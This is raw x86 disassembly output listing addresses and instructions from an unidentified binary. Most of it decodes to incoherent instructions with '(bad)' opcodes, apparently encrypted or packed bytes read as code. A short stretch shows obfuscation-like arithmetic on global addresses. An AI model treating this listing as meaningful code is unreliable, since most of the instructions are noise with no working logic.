  409393:	adc    esp,DWORD PTR ds:0x899ccf3e
  409399:	or     BYTE PTR [ebx+0x458b0c45],cl
  40939f:	or     bh,bh
  4093a1:	jne    0x40939b
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	int    0xda
  4093b6:	mov    eax,0x7eddd839
  4093bb:	jle    0x4093e1
  4093bd:	jl     0x40943d
  4093bf:	jle    0x40938e
  4093c1:	fucomi st,st(7)
  4093c3:	cli    
  4093c4:	push   ebp
  4093c5:	ins    DWORD PTR es:[edi],dx
  4093c6:	cmp    ch,dl
  4093c8:	dec    BYTE PTR [ebx+ebp*4]
  4093cb:	pop    ebx
  4093cc:	not    BYTE PTR [esi+0x6b]
  4093cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093d0:	xchg   esi,eax
  4093d1:	mov    esi,0x2813120a
  4093d6:	jns    0x4093ab
  4093d8:	mov    ds:0x13711ef4,al
  4093dd:	inc    ebx
  4093de:	dec    ebx
  4093df:	sub    DWORD PTR [edi],esi
  4093e1:	adc    eax,0xd800556
  4093e6:	and    al,0x38
  4093e8:	xchg   edi,esp
  4093ea:	out    0x42,eax
  4093ec:	dec    esp
  4093ed:	cs jb  0x409406
  4093f0:	xor    BYTE PTR ds:0xdc360c64,ch
  4093f6:	repz inc DWORD PTR [ebx]
  4093f9:	cs mov edx,0xd468d76b
  4093ff:	push   esp
  409400:	in     eax,0xdf
  409402:	dec    esp
  409403:	loope  0x409407
  409405:	cli    
  409406:	or     DWORD PTR [edx-0x3cc8aec],edi
  40940c:	xchg   edx,eax
  40940d:	sbb    al,0xd6
  40940f:	cmp    eax,0x72f25532
  409414:	enter  0xf140,0x2a
  409418:	cmp    DWORD PTR [esi],ecx
  40941a:	xchg   esp,eax
  40941b:	dec    edx
  40941c:	sbb    eax,0x21a92795
  409421:	dec    ecx
  409422:	ret    0x8ef7
  409425:	and    eax,0x86d79000
  40942a:	test   BYTE PTR [edx+0x67d05e1f],bl
  409430:	and    al,0xe2
  409432:	fistp  DWORD PTR [edx]
  409434:	mov    edx,0x633979c9
  409439:	mov    ds:0x79f247fb,al
  40943e:	or     DWORD PTR fs:[ebx+ebp*2],edi
  409442:	xchg   edi,eax
  409443:	fisttp WORD PTR [edx]
  409445:	iret   
  409446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409447:	ds and eax,0x2b9105b7
  40944d:	push   eax
  40944e:	or     ecx,edx
  409450:	lods   al,BYTE PTR ds:[esi]
  409451:	in     al,dx
  409452:	repnz mov esi,ecx
  409455:	mov    dl,0x27
  409457:	add    al,0xb8
  40945a:	in     al,0x13
  40945c:	cwde   
  40945d:	sub    BYTE PTR [ecx],dh
  40945f:	mov    dh,0x0
  409461:	jns    0x4094e2
  409463:	outs   dx,DWORD PTR ds:[esi]
  409464:	shl    edx,cl
  409466:	sub    eax,0x682ddae0
  40946b:	iret   
  40946c:	or     al,0x72
  40946e:	js     0x409489
  409470:	jmp    FWORD PTR [esi-0x61]
  409473:	pop    esp
  409474:	jmp    0x9006:0xbecc6ea1
  40947b:	pop    ds
  40947c:	jo     0x4094f8
  40947e:	popa   
  40947f:	pushf  
  409480:	stos   BYTE PTR es:[edi],al
  409481:	dec    eax
  409482:	sub    dh,dl
  409484:	(bad)  
  409486:	or     al,0x8c
  409488:	shl    BYTE PTR [esi+0x24],1
  40948b:	pusha  
  40948c:	mov    dl,0x50
  40948e:	pop    edi
  40948f:	or     eax,0xcda69d6b
  409494:	xchg   esi,eax
  409495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409496:	in     eax,0x38
  409498:	data16 mov dh,0xfe
  40949b:	pop    ebx
  40949c:	mov    esp,0x5303072a
  4094a1:	mov    al,cl
  4094a3:	push   ss
  4094a4:	sub    al,0x5c
  4094a6:	call   0x4ba6:0x14b0650e
  4094ad:	inc    ebp
  4094ae:	mov    dl,0xc5
  4094b0:	(bad)  
  4094b1:	rcl    bh,0xa4
  4094b4:	stc    
  4094b5:	ins    BYTE PTR es:[edi],dx
  4094b6:	dec    ecx
  4094b7:	ss popa 
  4094b9:	mov    cl,0xc9
  4094bb:	fldcw  WORD PTR [ecx-0x5ee216c7]
  4094c1:	int    0x38
  4094c3:	jmp    DWORD PTR [ebp+0x55]
  4094c6:	cdq    
  4094c7:	inc    edi
  4094c8:	jne    0x40949b
  4094ca:	fdivr  DWORD PTR [ecx]
  4094cc:	mov    eax,0x4fd01940
  4094d1:	cmp    eax,0x4e46e150
  4094d6:	cs std 
  4094d8:	mov    cl,BYTE PTR [edx]
  4094da:	push   ebx
  4094db:	imul   eax,DWORD PTR [edx+ecx*1-0x4f119e9d],0xffffffaf
  4094e3:	push   cs
  4094e4:	retf   
  4094e5:	jmp    FWORD PTR [ebp-0x3e]
  4094e8:	(bad)  
  4094e9:	arpl   WORD PTR [ecx],bx
  4094eb:	adc    eax,0x5807750b
  4094f0:	(bad)  
  4094f1:	gs cli 
  4094f3:	xchg   esp,eax
  4094f4:	fisubr DWORD PTR [ebp+0x59]
  4094f7:	jns    0x409561
  4094f9:	pop    ebp
  4094fa:	and    BYTE PTR [ebp-0x8],ch
  4094fd:	pop    ds
  4094fe:	jecxz  0x40950d
  409500:	jmp    0x40949d
  409502:	icebp  
  409503:	in     al,dx
  409504:	cwde   
  409505:	inc    edx
  409506:	jmp    0x684b923e
  40950b:	xor    al,0x49
  40950d:	inc    ecx
  40950e:	jg     0x409535
  409510:	(bad)
  409513:	inc    esi
  409514:	(bad)  
  409515:	bound  edx,QWORD PTR [ecx-0x3a4ba575]
  40951b:	call   0x106b8eab
  409520:	add    ecx,ebp
  409522:	inc    ebx
  409523:	add    eax,0x4854b743
  409528:	xor    DWORD PTR [ebx],0x2c480a36
  40952e:	shr    WORD PTR [ebp+0x74],0x56
  409533:	test   BYTE PTR [edx+0x691f1592],bh
  409539:	xchg   edx,eax
  40953a:	clc    
  40953b:	ds inc ebp
  40953d:	dec    esp
  40953e:	(bad)  
  40953f:	and    DWORD PTR [ecx],esp
  409541:	int    0xf5
  409543:	fimul  WORD PTR [esi-0x52]
  409546:	icebp  
  409547:	dec    ebx
  409548:	pop    edx
  409549:	cmp    BYTE PTR [edi*1-0x512c1f22],dl
  409550:	out    0x74,al
  409552:	push   esi
  409553:	push   eax
  409554:	xor    DWORD PTR [ebp-0xa],edi
  409557:	cmp    BYTE PTR [ecx+0x7e],bh
  40955a:	xor    eax,esi
  40955c:	mov    ds,WORD PTR [edx+ebp*8-0x7185fa19]
  409563:	jno    0x4095ae
  409565:	and    ah,BYTE PTR [ebp-0x33631d2b]
  40956b:	push   eax
  40956c:	(bad)  
  40956d:	fbstp  TBYTE PTR [esi-0x2e375209]
  409573:	sub    al,0x4c
  409575:	adc    eax,DWORD PTR [edi]
  409577:	rol    BYTE PTR [eax-0x29e45583],0x99
  40957e:	rcr    BYTE PTR [ebx],0xfe
  409581:	inc    edx
  409582:	lahf   
  409583:	sbb    al,0x5a
  409585:	xor    eax,0x422e1829
  40958a:	sub    ecx,esp
  40958c:	aad    0x9c
  40958e:	popa   
  40958f:	retf   0xb02a
  409592:	add    al,0xfa
  409594:	jne    0x409525
  409596:	push   eax
  409597:	fisttp QWORD PTR [esi-0x3e0226fa]
  40959d:	and    esi,DWORD PTR [eax+edx*2+0x2b]
  4095a1:	jnp    0x409620
  4095a3:	pop    ecx
  4095a4:	aaa    
  4095a5:	test   eax,0x22341c4f
  4095aa:	pop    ebp
  4095ab:	mov    dh,0x95
  4095ad:	jp     0x4095cd
  4095af:	popa   
  4095b0:	inc    edx
  4095b1:	add    cl,al
  4095b3:	push   ebx
  4095b4:	inc    ecx
  4095b5:	das    
  4095b6:	ss cs in eax,0xc4
  4095ba:	lock jge 0x40954b
  4095bd:	ret    0xbb73
  4095c0:	sub    BYTE PTR [ebp-0x14],dh
  4095c3:	adc    eax,0xbf5fc7f3
  4095c8:	xchg   ecx,eax
  4095c9:	cmp    BYTE PTR [di+0x592d],cl
  4095ce:	loopne 0x409592
  4095d0:	(bad)  
  4095d1:	pop    edx
  4095d2:	ror    DWORD PTR [edx+0x649909df],1
  4095d8:	xor    al,0x8f
  4095da:	mov    bh,0xf9
  4095dc:	mov    esi,0x762f0d01
  4095e1:	in     al,dx
  4095e2:	jl     0x409608
  4095e4:	jae    0x4095bd
  4095e6:	dec    ecx
  4095e7:	push   ecx
  4095e8:	jecxz  0x4095bf
  4095ea:	call   0x406b0f
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8ea7:0x3af774e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	inc    esi
  40960d:	mov    ebp,0x8e74ecfd
  409612:	jmp    0xbc2d3165
  409617:	(bad)
  40961a:	sti    
  40961b:	push   cs
  40961c:	adc    eax,DWORD PTR [edx-0x6b]
  40961f:	je     0x409617
  409621:	jmp    0x9d07:0xd3766a4d
  409628:	fild   QWORD PTR [eax+0x2]
  40962b:	ret    
  40962c:	int    0x50
  40962e:	add    BYTE PTR [edi],ah
  409630:	adc    ebx,DWORD PTR [edi-0x57]
  409633:	adc    DWORD PTR [ecx],ebp
  409635:	not    DWORD PTR [edx+0x53574f1f]
  40963b:	mov    dh,0x8c
  40963d:	mov    esi,0xcd9c15fa
  409642:	pop    ds
  409643:	cmp    DWORD PTR [edi-0x6b28efa0],eax
  409649:	push   esp
  40964a:	dec    esp
  40964b:	mov    ch,0x32
  40964d:	mov    ebx,0x960471b
  409652:	daa    
  409653:	push   ds
  409654:	cmc    
  409655:	(bad)  
  409656:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409657:	lods   eax,DWORD PTR ds:[esi]
  409658:	push   cs
  409659:	enter  0x3227,0xaa
  40965d:	rcr    dh,cl
  40965f:	xor    dl,bh
  409661:	test   DWORD PTR [esi-0x1fff8ecd],ebx
  409667:	lods   al,BYTE PTR ds:[esi]
  409668:	enter  0xaae2,0xdc
  40966c:	rcl    cl,1
  40966e:	push   edi
  40966f:	data16 rcl BYTE PTR [ecx+0x2f],cl
  409673:	mov    ah,ch
  409675:	sub    edx,DWORD PTR [eax+0x2577f188]
  40967b:	js     0x409613
  40967d:	cmp    dl,BYTE PTR [ecx+0x49]
  409680:	popf   
  409681:	dec    edi
  409682:	je     0x4096c1
  409684:	(bad)  
  409685:	pusha  
  409686:	(bad)  
  409688:	shl    DWORD PTR [edi+0x6dc62781],1
  40968e:	sub    DWORD PTR [edi+0x72],0xffffffaa
  409692:	int    0xf4
  409694:	dec    esi
  409695:	and    eax,0x206396aa
  40969a:	popa   
  40969b:	shl    DWORD PTR [ecx-0x3e],1
  40969e:	mov    ecx,0x4b4db629
  4096a3:	sbb    al,al
  4096a5:	xor    BYTE PTR [ecx],dh
  4096a7:	in     al,0xd6
  4096a9:	leave  
  4096aa:	xchg   BYTE PTR [ebx-0x3f],dl
  4096ad:	pop    edx
  4096ae:	sbb    DWORD PTR [edx],eax
  4096b0:	xchg   ecx,eax
  4096b1:	not    dl
  4096b3:	jmp    0x9a4d:0xc807b9f4
  4096ba:	bound  esi,QWORD PTR [ebx]
  4096bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096bd:	ret    0xa130
  4096c0:	mov    ?,WORD PTR ds:0x3e34020e
  4096c6:	xchg   ebx,eax
  4096c7:	xchg   ebx,eax
  4096c8:	daa    
  4096c9:	and    eax,0x9c162d91
  4096ce:	mov    ch,bh
  4096d0:	sets   dh
  4096d3:	xor    al,BYTE PTR [edi-0x1c]
  4096d6:	stc    
  4096d7:	push   ss
  4096d8:	add    BYTE PTR [edi],ah
  4096da:	(bad)  
  4096db:	or     al,0xff
  4096dd:	mov    ch,0x5c
  4096df:	div    DWORD PTR [esp+ebx*8]
  4096e2:	les    eax,FWORD PTR [edi]
  4096e4:	pop    eax
  4096e5:	mov    ecx,0x5e363ab4
  4096ea:	lock push DWORD PTR [edx-0x53d70175]
  4096f1:	push   0xffffff86
  4096f3:	bnd ret 
  4096f5:	cmp    BYTE PTR [edx+0x4b],ch
  4096f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096f9:	in     eax,dx
  4096fa:	push   ecx
  4096fb:	test   DWORD PTR [ebp+ebp*1+0x33],eax
  4096ff:	jle    0x4096fd
  409701:	mov    ds:0x35a97c5b,eax
  409706:	push   edi
  409707:	adc    ecx,DWORD PTR [ecx-0x6c5c2572]
  40970d:	xor    eax,0x31c2e623
  409712:	fnsave [edi+0x7d]
  409715:	mov    ds:0x3554d856,al
  40971a:	dec    edx
  40971b:	fwait
  40971c:	jge    0x4096bd
  40971e:	fs dec esp
  409720:	cmp    ebp,esp
  409722:	inc    ebp
  409723:	mov    bh,0x60
  409725:	inc    ebx
  409726:	test   eax,0xbb636cc7
  40972b:	cmp    esp,DWORD PTR [ecx+esi*4]
  40972e:	in     al,0x8e
  409730:	sahf   
  409731:	mov    esi,0x2c390347
  409736:	in     al,dx
  409737:	aad    0xde
  409739:	(bad)  
  40973a:	inc    BYTE PTR [ecx-0x59]
  40973d:	imul   eax,DWORD PTR [ebp+0x15],0x4f4a6ec
  409744:	les    edx,FWORD PTR [edi-0x501305b]
  40974a:	cdq    
  40974b:	fwait
  40974c:	xchg   esp,eax
  40974d:	sub    al,0xa3
  40974f:	popf   
  409750:	sbb    al,0xcf
  409752:	add    ch,0xa2
  409755:	or     eax,DWORD PTR ds:0xb602d4bf
  40975b:	cli    
  40975c:	sbb    dh,BYTE PTR [edi]
  40975e:	lods   al,BYTE PTR ds:[esi]
  40975f:	xchg   BYTE PTR [ebp+0x68],dl
  409762:	sub    bl,BYTE PTR es:[esi-0x61b0cb68]
  409769:	dec    edi
  40976a:	xchg   ecx,eax
  40976b:	cmp    BYTE PTR ds:0xbf16d4f8,ch
  409771:	mov    dh,0xf5
  409773:	jmp    0x1cfdd8fb
  409778:	pop    esi
  409779:	xchg   eax,esi
  40977b:	mov    BYTE PTR [edx+ebp*8+0x5107d17],dl
  409782:	sub    eax,0x148899e3
  409787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409788:	mov    edi,DWORD PTR [bx+di-0x3518]
  40978d:	fcmovbe st,st(5)
  40978f:	xchg   ecx,eax
  409790:	push   esp
  409791:	xacquire xchg BYTE PTR [ebx-0x2b9b664c],ch
  409798:	pusha  
  409799:	inc    ebp
  40979a:	and    ebp,DWORD PTR [ebp-0x26]
  40979d:	stc    
  40979e:	sbb    al,0x79
  4097a0:	mov    cl,0xea
  4097a2:	jmp    0x4097fb
  4097a4:	outs   dx,BYTE PTR ds:[esi]
  4097a5:	arpl   WORD PTR [edx-0x2ea0b7fe],cx
  4097ab:	in     eax,dx
  4097ac:	inc    edx
  4097ad:	push   0x24
  4097af:	call   0xdf3f:0x2ea93bbc
  4097b6:	out    0xfc,al
  4097b8:	xchg   esi,ecx
  4097ba:	into   
  4097bb:	mov    edx,0xa583e039
  4097c0:	or     al,0x86
  4097c2:	jge    0x4097bd
  4097c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097c5:	xchg   esi,eax
  4097c6:	push   esi
  4097c7:	rep outs dx,DWORD PTR ds:[esi]
  4097c9:	arpl   WORD PTR [ecx],cx
  4097cb:	lds    edx,FWORD PTR [ecx+ebp*8+0x7c9d22dc]
  4097d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097d3:	cmp    al,0x15
  4097d5:	and    DWORD PTR [eax+0x5bf45a90],eax
  4097db:	xor    al,0xcc
  4097dd:	test   eax,0x14bbec81
  4097e2:	jae    0x409814
  4097e4:	cmp    edi,DWORD PTR [ecx+0x0]
  4097e7:	adc    al,0x5c
  4097e9:	rcr    BYTE PTR [edi],0x30
  4097ec:	sbb    dh,ch
  4097ee:	pop    ecx
  4097ef:	(bad)  
  4097f0:	sub    esi,esi
  4097f2:	xchg   ecx,eax
  4097f3:	adc    BYTE PTR [edx],al
  4097f5:	jmp    0x61ba:0x9ecd3b14
  4097fc:	pop    esi
  4097fd:	push   es
  4097fe:	sbb    esp,DWORD PTR [edi]
  409800:	push   ebp
  409801:	cmp    al,0xaf
  409803:	sbb    edi,ebp
  409805:	xor    al,0x4a
  409807:	jmp    0x2a4:0xa005daf0
  40980e:	aaa    
  40980f:	aad    0x8e
  409811:	add    esi,edx
  409813:	rol    BYTE PTR [edi-0xd9eabf],1
  409819:	cmp    DWORD PTR [esi+ebp*2],edx
  40981c:	pop    edi
  40981d:	inc    esi
  40981e:	stc    
  40981f:	js     0x4097e5
  409821:	(bad)  
  409822:	ds test eax,0x5e019a03
  409828:	ret    0xf67f
  40982b:	mov    DWORD PTR [esi-0x19],ebx
  40982e:	add    dl,BYTE PTR [esp+esi*8]
  409831:	xchg   esi,eax
  409832:	ret    
  409833:	(bad)  
  409834:	push   cs
  409835:	loop   0x4097c2
  409837:	inc    ebp
  409838:	hlt    
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4336df
  40986f:	xor    DWORD PTR ds:0x433617,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4336db,0x4336ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433667,0x433713
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4335fb
  4098a6:	sub    DWORD PTR ds:0x4336df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	lods   eax,DWORD PTR ds:[esi]
  4098c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098c2:	ficomp DWORD PTR [esp+esi*4-0x27]
  4098c6:	jle    0x409946
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	and    eax,0x516a15ec
  4098d1:	fidiv  WORD PTR [ebx+0x23e0cb28]
  4098d7:	out    dx,al
  4098d8:	clc    
  4098d9:	arpl   WORD PTR [eax-0x2835e41b],dx
  4098df:	dec    edi
  4098e0:	ss gs xchg edx,eax
  4098e3:	enter  0xfeb4,0xa4
  4098e7:	push   eax
  4098e8:	xchg   edi,eax
  4098e9:	cmc    
  4098ea:	data16 js 0x40988b
  4098ed:	add    BYTE PTR [edi-0xa30c725],ah
  4098f3:	stos   DWORD PTR es:[edi],eax
  4098f4:	cmp    eax,0x407e92d0
  4098f9:	adc    edx,esp
  4098fb:	push   ebx
  4098fc:	fldenv [edi]
  4098fe:	pop    edx
  4098ff:	jae    0x409916
  409901:	add    DWORD PTR [ecx+0x7c4a4c3d],edx
  409907:	repz jecxz 0x40995c
  40990a:	sub    bh,bl
  40990c:	mov    ss,WORD PTR [edi]
  40990e:	not    dh
  409910:	inc    esp
  409911:	mov    edi,0x7ab57d54
  409916:	mov    esi,0x43b0e4eb
  40991b:	adc    edx,eax
  40991d:	mov    dh,0xfe
  40991f:	inc    ebp
  409920:	and    eax,0x36682548
  409925:	outs   dx,DWORD PTR ds:[esi]
  409926:	cli    
  409927:	fcmovne st,st(1)
  409929:	adc    dh,BYTE PTR [eax-0x65]
  40992c:	adc    BYTE PTR [edx-0x27442c4b],dl
  409932:	repnz fsub DWORD PTR [eax+eiz*2-0x2b]
  409937:	dec    eax
  409938:	and    al,0x76
  40993a:	and    dh,BYTE PTR [edi+0xb]
  40993d:	inc    edi
  40993e:	test   eax,0x915c6195
  409943:	rol    DWORD PTR [eax],0x0
  409946:	xchg   esi,eax
  409947:	dec    ebp
  409948:	fndisi(8087 only) 
  40994a:	xor    esp,DWORD PTR [ebx]
  40994c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40994d:	or     BYTE PTR [edi],ch
  40994f:	jne    0x409936
  409951:	jge    0x40990b
  409953:	loope  0x40995a
  409955:	in     eax,0xf4
  409957:	or     eax,0x603b9e23
  40995c:	aaa    
  40995d:	inc    ebp
  40995e:	mov    edx,0xe2a93fa7
  409963:	xor    ah,cl
  409965:	push   ss
  409966:	je     0x409925
  409968:	inc    eax
  409969:	adc    al,BYTE PTR [ecx-0x29]
  40996c:	jmp    0xad1ce0ba
  409971:	enter  0x9535,0xaf
  409975:	adc    dl,bh
  409977:	ins    BYTE PTR es:[edi],dx
  409978:	add    bh,BYTE PTR ds:0x23b2c6eb
  40997e:	mov    dl,0xd2
  409980:	xor    eax,0xae3fa964
  409985:	nop
  409986:	push   es
  409987:	data16 cmp dh,BYTE PTR [ebp-0x3a]
  40998b:	xchg   esp,eax
  40998c:	sub    DWORD PTR [esi],eax
  40998e:	ins    BYTE PTR es:[edi],dx
  40998f:	pop    edx
  409990:	or     BYTE PTR [ebp-0x5791a134],dl
  409996:	cdq    
  409997:	xchg   esp,eax
  409998:	dec    esp
  409999:	lahf   
  40999a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40999b:	or     esi,edx
  40999d:	xchg   BYTE PTR [ebp+0x39],al
  4099a0:	pop    esi
  4099a1:	(bad)  
  4099a2:	(bad)  
  4099a4:	call   0x7c5e03b7
  4099a9:	enter  0x5549,0x85
  4099ad:	push   cs
  4099ae:	add    eax,0xb84d65fc
  4099b3:	dec    eax
  4099b4:	mov    ah,0xba
  4099b6:	pop    esp
  4099b7:	div    DWORD PTR [ecx+0x51]
  4099ba:	jge    0x409964
  4099bc:	push   esi
  4099bd:	nop
  4099be:	fld    QWORD PTR [ecx+0x6e]
  4099c1:	mov    ah,0xc7
  4099c3:	cmp    ecx,DWORD PTR [edi]
  4099c5:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4099c7:	popa   
  4099c8:	sub    esp,edi
  4099ca:	outs   dx,BYTE PTR ds:[esi]
  4099cb:	or     eax,0xc1e5876
  4099d0:	add    BYTE PTR [ebx+0x12],ah
  4099d3:	ins    DWORD PTR es:[edi],dx
  4099d4:	mov    edi,DWORD PTR [edi-0x57]
  4099d7:	push   edx
  4099d8:	ds dec edi
  4099da:	aam    0xf8
  4099dc:	ja     0x409975
  4099de:	or     BYTE PTR [ebp+eax*2+0x2f],bl
  4099e2:	lea    ebx,ds:0x58b40689
  4099e8:	jo     0x4099c5
  4099ea:	lods   al,BYTE PTR ds:[esi]
  4099eb:	in     al,0x92
  4099ed:	dec    ebx
  4099ee:	mov    edi,0x46bb8791
  4099f3:	in     eax,0x7a
  4099f5:	add    al,0x11
  4099f7:	cmp    eax,0x9f9e7278
  4099fc:	xchg   ebx,eax
  4099fd:	push   eax
  4099fe:	add    DWORD PTR [edi],edx
  409a00:	stos   BYTE PTR es:[edi],al
  409a01:	bound  esi,QWORD PTR [ecx+0x27]
  409a04:	in     al,0xa3
  409a06:	pop    esp
  409a07:	(bad)  
  409a08:	sti    
  409a09:	mov    edx,0x8fab2f8
  409a0e:	cmp    DWORD PTR [edx+0x511ac52d],ebp
  409a14:	sbb    DWORD PTR [edx-0x14],ecx
  409a17:	mov    al,0xfb
  409a19:	dec    edx
  409a1a:	int    0xaa
  409a1c:	ret    
  409a1d:	fs mov al,0xc4
  409a20:	xchg   BYTE PTR [ebx-0x43],bh
  409a23:	les    edi,FWORD PTR ds:0x998d116e
  409a29:	mov    ecx,0x804416b9
  409a2e:	in     eax,0xb3
  409a30:	into   
  409a31:	dec    esp
  409a32:	sar    BYTE PTR [esi-0x2ba95bd9],cl
  409a38:	hlt    
  409a39:	rcr    DWORD PTR [edx],1
  409a3b:	and    DWORD PTR [ebx-0x52],edx
  409a3e:	add    eax,0x2d0ba78a
  409a43:	adc    ch,BYTE PTR [edi]
  409a45:	jae    0x409a53
  409a47:	in     eax,dx
  409a48:	xor    BYTE PTR [ecx+0x7b],ah
  409a4b:	cmp    esp,DWORD PTR [eax-0x71d47e02]
  409a51:	retf   0x44c7
  409a54:	jnp    0x409a54
  409a56:	fstp   DWORD PTR [esp+ecx*1+0x59]
  409a5a:	(bad)  
  409a5c:	sti    
  409a5d:	jae    0x409a59
  409a5f:	std    
  409a60:	mov    esp,0xcf8d8f4f
  409a65:	mov    cl,0xce
  409a67:	mov    ecx,DWORD PTR [esi]
  409a69:	aam    0xeb
  409a6b:	dec    ebx
  409a6c:	pop    edx
  409a6d:	add    eax,0xafa7d8b9
  409a72:	pop    esp
  409a73:	sub    eax,0x891a7672
  409a78:	fcom   DWORD PTR [edx+ebx*2-0x29]
  409a7c:	pop    es
  409a7d:	(bad)  
  409a7e:	mov    edi,0x366f38ff
  409a83:	pop    ds
  409a84:	cdq    
  409a85:	xchg   edi,eax
  409a86:	and    al,BYTE PTR [eax+0x5eacd93a]
  409a8c:	inc    esi
  409a8d:	mov    esp,0xc1025b21
  409a92:	dec    dl
  409a94:	ins    BYTE PTR es:[edi],dx
  409a95:	mov    eax,ds:0x1fd01a10
  409a9a:	mov    cl,0xec
  409a9c:	mov    al,ds:0x7d811216
  409aa1:	sbb    edi,edi
  409aa3:	jnp    0x409af6
  409aa5:	jnp    0x409b24
  409aa7:	pushf  
  409aa8:	inc    ebx
  409aa9:	cmp    ebp,ecx
  409aab:	xchg   ebp,eax
  409aac:	or     esi,0x924334e3
  409ab2:	pop    edi
  409ab3:	push   cs
  409ab4:	in     eax,0x92
  409ab6:	xchg   edi,eax
  409ab7:	pushf  
  409ab8:	jmp    0x5d7f:0x81f4b6b5
  409abf:	mov    ds:0xd210422a,al
  409ac4:	rol    DWORD PTR [ecx],1
  409ac6:	out    dx,eax
  409ac7:	lods   al,BYTE PTR ds:[esi]
  409ac8:	rol    esi,1
  409aca:	and    al,bl
  409acc:	je     0x409b20
  409ace:	mov    edx,0x1ee18fe5
  409ad3:	out    dx,eax
  409ad4:	sti    
  409ad5:	pop    DWORD PTR [ebp+ecx*2-0x49fd11d9]
  409adc:	and    dl,BYTE PTR [eax+esi*1-0x5b153ae]
  409ae3:	add    ah,BYTE PTR [eax-0x10a29592]
  409ae9:	or     DWORD PTR [ebx-0x15643346],edx
  409aef:	es xchg ebp,eax
  409af1:	xchg   ebp,eax
  409af2:	jne    0x409b08
  409af4:	push   ds
  409af5:	dec    ecx
  409af6:	leave  
  409af7:	dec    esp
  409af8:	mov    al,ds:0xe37addee
  409afd:	jge    0x409b0b
  409aff:	push   eax
  409b00:	in     eax,dx
  409b01:	test   al,0x7d
  409b03:	or     BYTE PTR [eax+0x7828f26],ah
  409b09:	inc    ebx
  409b0a:	mov    ecx,0x7b85d21d
  409b0f:	pop    ss
  409b10:	xchg   esi,eax
  409b11:	fs push esi
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43369f,0x433653
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x702797d4]
  409b32:	xor    al,0x7e
  409b34:	in     al,0x7e
  409b36:	jle    0x409b70
  409b38:	jl     0x409bb8
  409b3a:	jle    0x409acb
  409b3c:	les    edi,FWORD PTR [ebx]
  409b3e:	sub    BYTE PTR ds:[edx-0x65f08d],bl
  409b45:	add    esp,ebp
  409b47:	js     0x409bab
  409b49:	shr    BYTE PTR [edx+0x6c],1
  409b4c:	mov    BYTE PTR [ebp+ebp*8+0x3532bd80],dh
  409b53:	mov    dh,0x2
  409b55:	int3   
  409b56:	int3   
  409b57:	inc    ecx
  409b58:	push   cs
  409b59:	jns    0x409b90
  409b5b:	lock mov edi,0xaec70ba9
  409b61:	pop    ss
  409b62:	cdq    
  409b63:	jae    0x409b6d
  409b65:	lahf   
  409b66:	or     eax,0x9b14005c
  409b6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b6c:	sbb    ebx,DWORD PTR ds:0xa86e1a0b
  409b72:	andps  xmm5,XMMWORD PTR [esp+edi*1]
  409b76:	enter  0x7460,0x50
  409b7a:	jnp    0x409b87
  409b7c:	sub    cl,ch
  409b7e:	xor    BYTE PTR [ebp-0x379d7651],dh
  409b84:	inc    ebp
  409b85:	shr    bh,1
  409b87:	mov    edx,cs
  409b89:	sbb    BYTE PTR [edi-0xf3850e8],ah
  409b8f:	pop    ebp
  409b90:	or     esp,DWORD PTR [ebx+0x7988bd2]
  409b96:	leave  
  409b97:	int    0xfb
  409b99:	outs   dx,DWORD PTR ds:[esi]
  409b9a:	scas   eax,DWORD PTR es:[edi]
  409b9b:	sar    BYTE PTR [ebp+eax*4+0x197a7177],0xc8
  409ba3:	inc    ecx
  409ba4:	mov    dh,ah
  409ba6:	and    BYTE PTR [edi+0x3ab467dd],ch
